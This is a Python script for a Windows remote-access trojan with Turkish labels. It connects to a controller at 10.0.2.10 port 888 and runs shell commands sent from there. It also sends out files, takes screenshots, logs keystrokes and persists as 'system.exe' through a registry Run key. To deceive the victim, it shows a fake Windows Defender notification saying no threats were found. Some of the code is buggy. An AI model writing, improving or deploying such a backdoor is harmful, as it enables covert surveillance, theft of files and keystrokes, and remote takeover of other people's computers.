import win10toast
import datetime
import subprocess
import time
import socket
import simplejson
import base64
import sys
import os
import pynput.keyboard
import scapy
import shutil
import pyautogui
class Connecting:

    def __init__(self,ip,port):
        self.connect = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connect.connect((ip,port))
        self.t=0
        
    def command_processing(self,command):
        try:
            if command[0] == "quit":
                self.connect.close()
                exit()
            elif command[0] == "cd" and len(command)>1:
                os.chdir(command[1])
                return subprocess.check_output("cd",shell=True)
            elif command[0] == "download":
                with open(command[1],"rb") as file:
                    return base64.b64encode(file.read())
            elif command[0] == "keylog":
                keys = ""
                def abc(key):
                    global keys
                    print("-------------------------")
                    try:
                        keys += str(key.char)
                    except AttributeError:
                        if key == key.space:
                            key += " "
                        elif key == key.backspace:
                            i = len(keys)
                            i -=1
                            l=0
                            result = ""
                            while i>l:
                                result += keys[l]
                                l +=1
                            keys = result
                        elif key == key.enter:
                            keys += "\n"
                        else:
                            keys += str(keys)
                    print(key)
                listen = pynput.keyboard.Listener(on_press=abc)
                with listen:
                    packaging(keys)
                    listen.join()
            elif command[0] == "screenshot":
                self.t += 1
                pyautogui.screenshot("appimage"+self.t+".png")
            elif command[0] == "upload":
                with open(command[1],"wb") as files:
                    files.write(base64.b64decode(command[2]))
                    return "uploaded"+command[1]
            elif command[0] == "göm":
                if not os.path.exists(os.environ["appdata"] + "\\"+command[2]):
                    shutil.copyfile(sys.executable, os.environ["appdata"] + "\\system.exe")
                    enrolment = "reg add Bilgisayar\HKEY_CURRENT_USER\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run /v "+command[1]+" /t REG_SZ /d " + os.environ["appdata"] + "\\system.exe"
                    subprocess.call(enrolment, shell=True)
                    return "Succsess"
            else:
                return subprocess.check_output(command, shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
        except Exception:
            return "Error!!!"

    def start(self):
        while True:
            com = self.unpacking()
            data = self.command_processing(com)
            self.packaging()
        self.connect.close()
    def packaging(self,data):
        packet = simplejson.dumps(data)
        self.connect.send(packet)
    def unpacking(self):
        incoming_data = ""
        while True:
            try:
                incoming_data = incoming_data + self.connect.recv(1024).decode("utf-8")
                return simplejson.loads(incoming_data)
            except ValueError:
                continue
def notification(saniye):
    time.sleep(5)
    a = datetime.datetime.now()
    toast = win10toast.ToastNotifier()
    toast.show_toast("Virüs ve tehdit koruması \n\n",f"\n\nWindows Defender Antivirus {a.hour}:{a.minute}:{a.second} saati {a.day}.{a.month}.{a.year} tarihinde cihazınızı taradı. Yeni tehdit bulunamadı.",icon_path="indir.ico", duration=saniye, threaded=True)
notification(10)

con = Connecting("10.0.2.10",888)
con.start()
